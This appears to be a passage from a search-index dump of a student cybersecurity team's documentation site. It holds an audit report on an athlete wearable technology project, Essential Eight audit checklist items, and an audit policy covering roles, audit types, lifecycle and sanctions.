1#11-are-the-correct-encryption-methods-being-used-for-data-in-storage-and-transmission","content":" Team is using a data set from the previous trimester and no data is being collected this trimester, this question is not applicable to the project.  ","version":"Next","tagName":"h3"},{"title":"1.2 Are the related DLP Policies being adhered to?​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project 1#12-are-the-related-dlp-policies-being-adhered-to","content":" Yes, DLP Policies are being followed. Everything the team have is stored on the GitHub repository where only the team have access, and the Team Leader and one other colleague are the only ones that manage the pull requests on GitHub.  ","version":"Next","tagName":"h3"},{"title":"1.3 Are the related Data Classification Policies being adhered to?​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project 1#13-are-the-related-data-classification-policies-being-adhered-to","content":" Yes, data which was gathered from the previous trimester has been filtered by this team and only the information which is necessary is being used.  ","version":"Next","tagName":"h3"},{"title":"1.4 Have forms of physical security for data protection been implemented?​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project 1#14-have-forms-of-physical-security-for-data-protection-been-implemented","content":" No, because data has not been collected by this current team, there has not been much focus on forms of physical security that have been deployed.  Recommendation: Physical infrastructure and data collection are limited for this team, resulting in a lack of physical security implementation. However, physical security of Athlete Wearable devices should be looked into once devices have been made available.  ","version":"Next","tagName":"h3"},{"title":"1.5 Have forms of digital security for data protection been implemented?​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project 1#15-have-forms-of-digital-security-for-data-protection-been-implemented","content":" This is similar to 1.4 in that no data is being gathered and little effort has been made to put plans for digital security into action.  Recommendation: The team should implement GitHub accounts which use two-factor authentication (2FA) to enable secure access to the platform.  ","version":"Next","tagName":"h3"},{"title":"1.6 Have EASM risks been identified?​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project 1#16-have-easm-risks-been-identified","content":" No, the team has not made a document outlining the potential External Attack Surface Management risks.  Recommendation: The team must review the EASM policy on the Redback Operations website and determine any risks that they may be held accountable for.  ","version":"Next","tagName":"h3"},{"title":"1.7 Have all employees undergone the appropriate User Awareness Training?​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project 1#17-have-all-employees-undergone-the-appropriate-user-awareness-training","content":" The Team Leader demonstrated how to use GitHub and informed his team members of their privileges. The Team Leader also showed them where they could review the online data set. However, the Cybersecurity Awareness Training document was not reviewed by the team.  Recommendation: The entire team should go over the training document as it contains policies implemented by Redback Operations to help inform employees about potential risks associated with their positions and duties.  ","version":"Next","tagName":"h3"},{"title":"Ethical Considerations and Requirements​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project 1#ethical-considerations-and-requirements","content":" ","version":"Next","tagName":"h2"},{"title":"2.1 Are all forms of data collection briefed with customers, and consent is gathered?​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project 1#21-are-all-forms-of-data-collection-briefed-with-customers-and-consent-is-gathered","content":" The data set being used was collected by the team during the previous trimester. They obtained the dataset from the previous trimester's Team Leader during the handover. Because the data was acquired from the previous trimester, this question was not relevant to the current team.  ","version":"Next","tagName":"h3"},{"title":"2.2 Has all collected information and data been classified with data classification requirements?​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project 1#22-has-all-collected-information-and-data-been-classified-with-data-classification-requirements","content":" Yes, the policy is being followed by the team as specified in 1.3.  ","version":"Next","tagName":"h3"},{"title":"2.3 Is data anonymity used to protect the privacy of customers?​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project 1#23-is-data-anonymity-used-to-protect-the-privacy-of-customers","content":" Yes, this is being followed, as personal information is not used and only the necessary information, such as heart rate and step data is used, and the data source is anonymous.  ","version":"Next","tagName":"h3"},{"title":"2.4 Is data minimalization being put in place when collecting data?​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project 1#24-is-data-minimalization-being-put-in-place-when-collecting-data","content":" Yes, the data is clean. The team had an original data set that had information that was not required, therefore the team made a new data set with only the necessary data (clean data).  ","version":"Next","tagName":"h3"},{"title":"2.5 Looping back to the ISMS policies, are they being adhered to when required?​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project 1#25-looping-back-to-the-isms-policies-are-they-being-adhered-to-when-required","content":" Yes, the Team Leader stated that everything was being adhered to and nothing was being violated.  ","version":"Next","tagName":"h3"},{"title":"Governance​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project 1#governance","content":" ","version":"Next","tagName":"h2"},{"title":"3.1 Is the team adhering to the company’s governance framework?​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project 1#31-is-the-team-adhering-to-the-companys-governance-framework","content":" Yes, this is being followed because all data used is in compliance with the company's governance framework.  ","version":"Next","tagName":"h3"},{"title":"3.2 Are team roles and responsibilities clearly defined and documented?​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project 1#32-are-team-roles-and-responsibilities-clearly-defined-and-documented","content":" Yes, roles have been clearly defined as they’ve separated the team into three parts: front end, back end, and data analysis, with the Team Leader and one of his colleagues juggling between the teams.  ","version":"Next","tagName":"h3"},{"title":"3.3 Is there a risk management plan in place?​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project 1#33-is-there-a-risk-management-plan-in-place","content":" No, The Team Leader believes that there is not much that can be risked in their project because data has not been acquired in this trimester.  Recommendation: A risk management plan should be developed regardless of current data collection status, to identify and mitigate potential risks related to future data handling and other parts of the project.  ","version":"Next","tagName":"h3"},{"title":"3.4 Is there an incident response plan in place?​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project 1#34-is-there-an-incident-response-plan-in-place","content":" The data set is stored in private repositories on GitHub in case of an emergency, and authorised users can request access by submitting a pull request. However, an incident response plan with structure and steps has not been made in the chance an incident occurs.  Recommendation: A dedicated plan should be constructed and everyone in the team should be aware of it in the chance an incident occurs.  ","version":"Next","tagName":"h3"},{"title":"3.5 Are incidents logged and reviewed for continuous improvement?​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project 1#35-are-incidents-logged-and-reviewed-for-continuous-improvement","content":" No, there is currently no process in place for logging and reviewing incidents.  Recommendation: The team should establish a system for documenting any incidents that occur throughout the trimester.  ","version":"Next","tagName":"h3"},{"title":"Recommendations and Conclusion​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project 1#recommendations-and-conclusion","content":" The audit gave significant insights into the Athlete Wearable Technology project's compliance with Redback Operations policies and standards. While certain parts of compliance, such as adherence to DLP and data classification criteria, were satisfied, the project's present phase, which is characterised by a lack of data collection, has resulted in a restricted focus on critical security and governance measures.  ","version":"Next","tagName":"h2"},{"title":"Areas in which Athlete Wearable Technology should focus on​","type":1,"pageTitle":"Athlete Wearable Technology Audit Report","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Athlete Wearable Technology Project 1#areas-in-which-athlete-wearable-technology-should-focus-on","content":" EASM and Risk Management: The team did not report identifying External Attack Surface Management risks or risk management plans. The lack of these processes means the project may be exposing itself to potential vulnerabilities in the future. Identifying and documenting the risk can support proactive decision-making in allocating resources. Incident Response and Continuous Improvement: There is no documented incident response plan and there is no detailed incident log. The lack of these documents could impact the team's ability to protect themselves against potential attacks. The project team must create an incident response plan. User Awareness Training: While initial training was implemented, the team did not review the Cybersecurity Awareness Training document. It will be vital for team members to be trained on the policies and procedures.  Overall, the project displays compliance in some areas, but the existing lack of data collecting has slowed down the development of more complete security standards. As the project progresses, resolving the identified gaps and recommendations will be critical to improving the integrity and security of the Athlete Wearable Technology Project. ","version":"Next","tagName":"h3"},{"title":"Annual Audit Checklist","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/annual-audit-checklist","content":"","keywords":"","version":"Next"},{"title":"Multi-Factor Authenticatio​","type":1,"pageTitle":"Annual Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/annual-audit-checklist#multi-factor-authenticatio","content":" ","version":"Next","tagName":"h2"},{"title":"ML1-MF-09 — Users are periodically trained on recognizing MFA-related phishing and social engineering attempts.​","type":1,"pageTitle":"Annual Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/annual-audit-checklist#ml1-mf-09--users-are-periodically-trained-on-recognizing-mfa-related-phishing-and-social-engineering-attempts","content":" Audit Procedure: Review training logs, completion rates, and test scores from awareness modules. Evidence Required: Training records, quiz results. Tools/Methods: KnowBe4, LMS Reports Responsible Team: Cybersecurity GRC Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"Office Macros​","type":1,"pageTitle":"Annual Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/annual-audit-checklist#office-macros","content":" ","version":"Next","tagName":"h2"},{"title":"ML1-OM-09 — Updates to Office macro policy are documented, reviewed, and approved.​","type":1,"pageTitle":"Annual Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/annual-audit-checklist#ml1-om-09--updates-to-office-macro-policy-are-documented-reviewed-and-approved","content":" Audit Procedure: Inspect change management and policy versioning records. Evidence Required: Change logs, approval emails, version control history. Tools/Methods: Confluence, SharePoint, GitHub Responsible Team: Cybersecurity GRC Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"Regular Backups​","type":1,"pageTitle":"Annual Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/annual-audit-checklist#regular-backups","content":" ","version":"Next","tagName":"h2"},{"title":"ML1-RB-01 — Identify and document important data, software, and configuration items in BCP for backup inclusion.​","type":1,"pageTitle":"Annual Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/annual-audit-checklist#ml1-rb-01--identify-and-document-important-data-software-and-configuration-items-in-bcp-for-backup-inclusion","content":" Audit Procedure: Review BCP and confirm data classification for backup. Evidence Required: Business Continuity Plan (BCP), asset register. Tools/Methods: Confluence, Excel, Asset Manager Responsible Team: Cybersecurity GRC Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit. ","version":"Next","tagName":"h3"},{"title":"Redback Operations Audit Policy","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit _Policy/Redback_Operations_Audit_Policy","content":"","keywords":"","version":"Next"},{"title":"Table of Contents​","type":1,"pageTitle":"Redback Operations Audit Policy","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit _Policy/Redback_Operations_Audit_Policy#table-of-contents","content":" IntroductionPurposeScopeRoles and Responsibilities Cybersecurity GRC TeamDevSecOps &amp; Platform TeamsSoftware &amp; Hardware TeamsProject Leads &amp; Academic CoordinatorsExternal Auditors (if engaged) Audit Types and Frequency Quarterly AuditPost-Incident AuditAd Hoc AuditAnnual Review Audit Audit Lifecycle Methodology PlanningExecutionReportingRemediation and Follow-Up Essential Eight Implementation and Testing Application Control (ML1-AC)Patch Management (ML1-PA/PO)Multi-Factor Authentication (ML1-MF)Restrict Administrative Privileges (ML1-RA)Configure Microsoft Office Macros (ML1-OM)User Application Hardening (ML1-AH)Regular Backups (ML1-RB)Patch Operating Systems (ML1-PO) Enforcement and SanctionsPolicy Maintenance and ReviewReferencesContact    ","version":"Next","tagName":"h2"},{"title":"1. Introduction​","type":1,"pageTitle":"Redback Operations Audit Policy","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit _Policy/Redback_Operations_Audit_Policy#1-introduction","content":" This Cybersecurity Audit Policy defines Redback Operations’ commitment to comprehensive, systematic auditing practices. It ensures a proactive and disciplined approach to managing cyber risks across critical systems such as virtual machines (VMs), cloud environments, code repositories, and embedded systems like the SmartBike. This policy is informed by the Australian Cyber Security Centre’s (ACSC) Essential Eight (E8) Maturity Model – Maturity Level One (ML1), ISO/IEC 27001, and relevant data protection legislation. It aims to validate the effectiveness of implemented cybersecurity controls and guide the continuous improvement of Redback’s security posture.    ","version":"Next","tagName":"h2"},{"title":"2. Purpose​","type":1,"pageTitle":"Redback Operations Audit Policy","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit _Policy/Redback_Operations_Audit_Policy#2-purpose","content":" This policy serves the following objectives:  Establish a transparent and standardised audit framework.Assess the maturity and effectiveness of cybersecurity controls.Identify weaknesses and reduce risk exposure through structured remediation.Ensure compliance with applicable internal standards, ACSC E8 guidelines, ISO/IEC 27001, and university governance requirements.Maintain a culture of accountability and security awareness.    ","version":"Next","tagName":"h2"},{"title":"3. Scope​","type":1,"pageTitle":"Redback Operations Audit Policy","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit _Policy/Redback_Operations_Audit_Policy#3-scope","content":" This policy covers all digital infrastructure and personnel involved in Redback Operations, including but not limited to:  Virtualised environments (e.g., Linux and Windows VMs)SmartBike embedded systems (hardware, firmware, runtime execution)Cloud platforms (e.g., GCP, AWS) and deployment pipelinesSource code repositories (e.g., GitHub, GitLab)Developer endpoints, admin tools, and software assetsThird-party services processing Redback data  All students, staff, and contributors with access to Redback environments are subject to this policy.    ","version":"Next","tagName":"h2"},{"title":"4. Roles and Responsibilities​","type":1,"pageTitle":"Redback Operations Audit Policy","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit _Policy/Redback_Operations_Audit_Policy#4-roles-and-responsibilities","content":" ","version":"Next","tagName":"h2"},{"title":"Cybersecurity GRC Team​","type":1,"pageTitle":"Redback Operations Audit Policy","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit _Policy/Redback_Operations_Audit_Policy#cybersecurity-grc-team","content":" Design and lead cybersecurity audits.Define scope and audit criteria.Maintain audit logs, findings registry, and maturity assessments.Recommend remediation actions and track closure.  ","version":"Next","tagName":"h3"},{"title":"DevSecOps & Platform Teams​","type":1,"pageTitle":"Redback Operations Audit Policy","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit _Policy/Redback_Operations_Audit_Policy#devsecops--platform-teams","content":" Implement controls aligned with audit outcomes.Provide patch management, configuration control, and access provisioning.Support enforcement of multi-factor authentication (MFA) and endpoint hardening.  ","version":"Next","tagName":"h3"},{"title":"Software & Hardware Teams​","type":1,"pageTitle":"Redback Operations Audit Policy","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit _Policy/Redback_Operations_Audit_Policy#software--hardware-teams","content":" Cooperate with audit inquiries relating to firmware, CI/CD workflows, and source control.Implement audit-based changes for application whitelisting, permissions, or runtime policies.  ","version":"Next","tagName":"h3"},{"title":"Project Leads & Academic Coordinators​","type":1,"pageTitle":"Redback Operations Audit Policy","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit _Policy/Redback_Operations_Audit_Policy#project-leads--academic-coordinators","content":" Review audit findings with team members.Validate resolution of assigned remediation items.Ensure contributors understand and apply secure development standards.  ","version":"Next","tagName":"h3"},{"title":"External Auditors (if engaged)​","type":1,"pageTitle":"Redback Operations Audit Policy","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit _Policy/Redback_Operations_Audit_Policy#external-auditors-if-engaged","content":" Provide independent assurance and verification of policy adherence.Report to academic and operational stakeholders.    ","version":"Next","tagName":"h3"},{"title":"5. Audit Types and Frequency​","type":1,"pageTitle":"Redback Operations Audit Policy","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit _Policy/Redback_Operations_Audit_Policy#5-audit-types-and-frequency","content":" Audit Type\tDescription\tFrequency / TriggerQuarterly Audit\tInternal audit to assess VM configs, GitHub, whitelisting\tEvery trimester Post-Incident Audit\tTriggered after breach, misconfiguration, anomaly\tWithin 7 days of incident detection Ad Hoc Audit\tBased on GRC, leadership, or academic supervisor request\tAs needed Annual Review Audit\tComprehensive policy and control validation\tOnce per academic calendar year  ","version":"Next","tagName":"h2"},{"title":"Quarterly Audit​","type":1,"pageTitle":"Redback Operations Audit Policy","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit _Policy/Redback_Operations_Audit_Policy#quarterly-audit","content":" Purpose: Assess baseline enforcement of critical security controls. Scope &amp; Activities:  VM Hardening: Patch validation, config integrity, unauthorised software checksGitHub Control: User access, admin role checks, MFA enforcementE8 Testing: Use E8MVT/ACVT to test controls, firmware whitelistingReporting: Categorise and flag recurring issues  ","version":"Next","tagName":"h3"},{"title":"Post-Incident Audit​","type":1,"pageTitle":"Redback Operations Audit Policy","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit _Policy/Redback_Operations_Audit_Policy#post-incident-audit","content":" Purpose: Root cause analysis and recovery validation Scope &amp; Activities:  Timeline: Log review and event reconstructionRoot Cause: Identify failures and gapsValidation: Backup restore testing, config verificationDocs: Incident report, ISMS/risk register update  ","version":"Next","tagName":"h3"},{"title":"Ad Hoc Audit​","type":1,"pageTitle":"Redback Operations Audit Policy","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit _Policy/Redback_Operations_Audit_Policy#ad-hoc-audit","content":" Purpose: Address risks or compliance checks outside regular cycle Scope &amp; Activities:  Targeted MFA &amp; access testingConfig reviews on high-risk systemsRe-check previously deferred controls  ","version":"Next","tagName":"h3"},{"title":"Annual Review Audit​","type":1,"pageTitle":"Redback Operations Audit Policy","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit _Policy/Redback_Operations_Audit_Policy#annual-review-audit","content":" Purpose: Review cybersecurity posture for compliance and maturity Scope &amp; Activities:  E8 maturity assessment across environmentsISO/IEC 27001 Annex A validationDisaster recovery drillsUpdate recommendations    ","version":"Next","tagName":"h3"},{"title":"6. Audit Lifecycle Methodology​","type":1,"pageTitle":"Redback Operations Audit Policy","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit _Policy/Redback_Operations_Audit_Policy#6-audit-lifecycle-methodology","content":" ","version":"Next","tagName":"h2"},{"title":"6.1 Planning​","type":1,"pageTitle":"Redback Operations Audit Policy","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit _Policy/Redback_Operations_Audit_Policy#61-planning","content":" Define audit scope and toolsAssign roles and notify stakeholders  ","version":"Next","tagName":"h3"},{"title":"6.2 Execution​","type":1,"pageTitle":"Redback Operations Audit Policy","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit _Policy/Redback_Operations_Audit_Policy#62-execution","content":" Use tools like E8MVT, ACVT, GitHub APICollect screenshots, logs, command outputs  ","version":"Next","tagName":"h3"},{"title":"6.3 Reporting​","type":1,"pageTitle":"Redback Operations Audit Policy","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit _Policy/Redback_Operations_Audit_Policy#63-reporting","content":" Classify findings (Critical, High, Medium, Low)Provide actionable recommendations  ","version":"Next","tagName":"h3"},{"title":"6.4 Remediation and Follow-Up​","type":1,"pageTitle":"Redback Operations Audit Policy","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit _Policy/Redback_Operations_Audit_Policy#64-remediation-and-follow-up","content":" Track implementationVerify and close in audit register    ","version":"Next","tagName":"h3"},{"title":"7. Essential Eight Implementation and Testing​","type":1,"pageTitle":"Redback Operations Audit Policy","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit _Policy/Redback_Operations_Audit_Policy#7-essential-eight-implementation-and-testing","content":" ","version":"Next","tagName":"h2"},{"title":"7.1 Application Control (ML1-AC)​","type":1,"pageTitle":"Redback Operations Audit Policy","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit _Policy/Redback_Operations_Audit_Policy#71-application-control-ml1-ac","content":" Allowlisting on VMs and SmartBikeBlock unauthorized executables and scriptsValidate via E8MVT test payloads  ","version":"Next","tagName":"h3"},{"title":"7.2 Patch Management (ML1-PA/PO)​","type":1,"pageTitle":"Redback Operations Audit Policy","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit _Policy/Redback_Operations_Audit_Policy#72-patch-management-ml1-papo","content":" Daily scans on internet-facing appsFortnightly internal updatesLog patches and decommission unsupported software  ","version":"Next","tagName":"h3"},{"title":"7.3 Multi-Factor Authentication (ML1-MF)​","type":1,"pageTitle":"Redback Operations Audit Policy","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit _Policy/Redback_Operations_Audit_Policy#73-multi-factor-authentication-ml1-mf","content":" Enforce MFA on GitHub, GCP, SSHMonthly report checks  ","version":"Next","tagName":"h3"},{"title":"7.4 Restrict Administrative Privileges (ML1-RA)​","type":1,"pageTitle":"Redback Operations Audit Policy","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit _Policy/Redback_Operations_Audit_Policy#74-restrict-administrative-privileges-ml1-ra","content":" Require documented justificationQuarterly privilege reviewSeparate admin and user accounts  ","version":"Next","tagName":"h3"},{"title":"7.5 Configure Microsoft Office Macros (ML1-OM)​","type":1,"pageTitle":"Redback Operations Audit Policy","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit _Policy/Redback_Operations_Audit_Policy#75-configure-microsoft-office-macros-ml1-om","content":" Currently not enforcedMonitor for future macro usage  ","version":"Next","tagName":"h3"},{"title":"7.6 User Application Hardening (ML1-AH)​","type":1,"pageTitle":"Redback Operations Audit Policy","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit _Policy/Redback_Operations_Audit_Policy#76-user-application-hardening-ml1-ah","content":" Not actively enforced currentlyFuture web apps to disable Java/Flash/ads  ","version":"Next","tagName":"h3"},{"title":"7.7 Regular Backups (ML1-RB)​","type":1,"pageTitle":"Redback Operations Audit Policy","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit _Policy/Redback_Operations_Audit_Policy#77-regular-backups-ml1-rb","content":" Weekly encrypted VM snapshotsOffsite GitHub syncingQuarterly restore drills  ","version":"Next","tagName":"h3"},{"title":"7.8 Patch Operating Systems (ML1-PO)​","type":1,"pageTitle":"Redback Operations Audit Policy","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit _Policy/Redback_Operations_Audit_Policy#78-patch-operating-systems-ml1-po","content":" Weekly patch cycleKernel and update validationRebuild outdated systems    ","version":"Next","tagName":"h3"},{"title":"8. Enforcement and Sanctions​","type":1,"pageTitle":"Redback Operations Audit Policy","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit _Policy/Redback_Operations_Audit_Policy#8-enforcement-and-sanctions","content":" Noncompliance may lead to:  Suspension of accessIncident escalationMandatory re-trainingRole reassignment or privilege loss  All sanctions are logged in the Audit Register.    ","version":"Next","tagName":"h2"},{"title":"9. Policy Maintenance and Review​","type":1,"pageTitle":"Redback Operations Audit Policy","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit _Policy/Redback_Operations_Audit_Policy#9-policy-maintenance-and-review","content":" Reviewed annually by the GRC TeamUpdated per regulation, incidents, or architectural changesCommunicated via Teams and GitHub    ","version":"Next","tagName":"h2"},{"title":"10. References​","type":1,"pageTitle":"Redback Operations Audit Policy","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit _Policy/Redback_Operations_Audit_Policy#10-references","content":" Redback Operations ISMSACSC Essential Eight – Maturity Level OneISO/IEC 27001:2013GitHub Security Best PracticesDeakin University Cybersecurity Policy    ","version":"Next","tagName":"h2"},{"title":"Contact​","type":1,"pageTitle":"Redback Operations Audit Policy","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit _Policy/Redback_Operations_Audit_Policy#contact","content":" Cybersecurity GRC Team 📄 Redback Documentation ","version":"Next","tagName":"h2"},{"title":"As-Needed Audit Checklist","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/as-needed-audit-checklist","content":"","keywords":"","version":"Next"},{"title":"Multi-Factor Authentication​","type":1,"pageTitle":"As-Needed Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/as-needed-audit-checklist#multi-factor-authentication","content":" ","version":"Next","tagName":"h2"},{"title":"ML1-MF-10 — Lost or stolen MFA tokens/devices are reported and revoked within 24 hours.​","type":1,"pageTitle":"As-Needed Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/as-needed-audit-checklist#ml1-mf-10--lost-or-stolen-mfa-tokensdevices-are-reported-and-revoked-within-24-hours","content":" Audit Procedure: Review helpdesk tickets and IAM logs for revocation response time. Evidence Required: Incident reports, audit trail of token disablement. Tools/Methods: Helpdesk Portal, IAM Logs Responsible Team: Cybersecurity GRC Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"Patch Applications​","type":1,"pageTitle":"As-Needed Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/as-needed-audit-checklist#patch-applications","content":" ","version":"Next","tagName":"h2"},{"title":"ML1-PA-05 — Exploitable vulnerabilities on internet-facing services are patched within 48 hours.​","type":1,"pageTitle":"As-Needed Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/as-needed-audit-checklist#ml1-pa-05--exploitable-vulnerabilities-on-internet-facing-services-are-patched-within-48-hours","content":" Audit Procedure: Map CVE disclosure date to patch application date and analyze lag. Evidence Required: Patch timeline table, remediation logs, CVE tracker screenshots. Tools/Methods: CVE Scanner, Manual review Responsible Team: DevSecOps Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit.    ","version":"Next","tagName":"h3"},{"title":"Patch Operating Systems​","type":1,"pageTitle":"As-Needed Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/as-needed-audit-checklist#patch-operating-systems","content":" ","version":"Next","tagName":"h2"},{"title":"ML1-PO-05 — Exploited vulnerabilities on internet-facing OSs are patched or mitigated within 48 hours.​","type":1,"pageTitle":"As-Needed Audit Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/as-needed-audit-checklist#ml1-po-05--exploited-vulnerabilities-on-internet-facing-oss-are-patched-or-mitigated-within-48-hours","content":" Audit Procedure: Compare known exploit CVE release vs. patch implementation time. Evidence Required: CVE timelines, patch logs, incident response summary. Tools/Methods: CVE Tracker, Patch Management Tools Responsible Team: DevSecOps Status: [ ] Pass [ ] Fail [ ] N/A Notes: Add notes here during audit. ","version":"Next","tagName":"h3"},{"title":"Audit Template","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/audit-template","content":"","keywords":"","version":"Next"},{"title":"Purpose​","type":1,"pageTitle":"Audit Template","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/audit-template#purpose","content":" The purpose of this document is to provide the guidelines to conduct an official inspection of our companies progress in complying with all listed standards, allowing us to continue to strive for our business goals and foster a safe and secure working environment. The goal of this audit is to outline any gaps in compliance, and to formulate action plans in response to these gaps. In an ideal world, this audit will work towards zero gaps in compliance for our company.  ","version":"Next","tagName":"h2"},{"title":"Audit Template​","type":1,"pageTitle":"Audit Template","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Audit Templates/audit-template#audit-template-1","content":" ","version":"Next","tagName":"h2"},{"title":"General Audit Points​","type":1,"pageTitle":"Audit Template","url":"/redback-documentation/docs/cybersecurity/GRC 